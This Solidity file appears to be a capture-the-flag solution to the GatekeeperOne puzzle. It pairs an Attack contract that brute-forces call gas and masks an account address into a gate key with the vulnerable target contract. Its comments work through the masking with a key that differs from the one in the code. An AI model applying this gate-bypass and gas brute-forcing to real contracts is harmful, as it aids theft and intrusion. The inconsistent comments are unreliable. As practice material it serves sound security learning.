// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    GatekeeperOne public target;
    // Gate 3
    // account 0x6507A5F34D98B8345e182EF588AB14A7F4E714AE
    // take last 16 digits of you account > uint64 or 8 bytes by casting
    bytes8 txOrigin16 = 0x88AB14A7F4E714AE;
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

    constructor(address _target) {
        target = GatekeeperOne(_target);
    }

    // Gate 2 > bruthe force the gas untill the right value fits with modulo
    function letMeIn() public {
        for (uint256 i = 0; i < 120; i++) {
            // using call because we need to control amount of gas
            (bool result, bytes memory data) = address(target)
                .call /* 
                3 = gas cost for a PUSH opcode
                8193 for the modulo
                150 ??
                */{
                gas: i + 150 + 8193 * 3
            }(abi.encodeWithSignature("enter(bytes8)", key));
            // result true > modulo 0
            if (result) {
                break;
            }
        }
    }
}

contract GatekeeperOne {
    address public entrant;
    uint256 i = uint256(uint160(address(tx.origin)));

    // need to deploy another contract to call
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    // send gas % 8191 = 0
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    /*
    Gate 3 require
    How to get 0xFFFFFFFF0000FFFF

    1. 0x0000FFFF = 0xFFFF 
    uint 32 bits = 4 bytes (0x0000FFFF) 
    uint 16 bits = 2 bytes (0xFFFF)

    Last 4 digits of account
    0x00006507 = 0x6507

    2. 0x0000FFFF != 0xFFFFFFFF0000FFFF
    uint 64 bits = 8 bytes (0xFFFFFFFF0000FFFF)

    3. 0x0000FFFF == uint 16 tx.origin value

    bytes8 txOrigin16 = 0x6507A5F34D98B834;
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

    AND operation
    8 byte    0x6507A5F34D98B834
    Mask      0xFFFFFFFF0000FFFF
    Key       0x6507A5340000B834

    */

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(i),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
